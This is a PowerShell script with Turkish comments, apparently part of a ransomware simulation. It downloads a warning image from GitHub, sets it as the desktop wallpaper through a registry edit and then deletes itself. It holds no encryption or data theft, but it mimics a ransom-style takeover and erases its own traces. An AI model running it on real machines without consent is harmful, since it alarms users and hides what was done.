# wall.ps1

# TEMP'e warning.png'yi indir
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/azizcan/ransom-sim/main/warning.png" -OutFile "$env:TEMP\warning.png"

# Masaüstü yolu
$desktopPath = [Environment]::GetFolderPath("Desktop")
$wallpaperPath = Join-Path $desktopPath "warning.png"

# warning.png'yi masaüstüne kopyala
Copy-Item -Path "$env:TEMP\warning.png" -Destination $wallpaperPath -Force

# Masaüstü arka planını değiştir
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $wallpaperPath /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

# Kendini sil
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
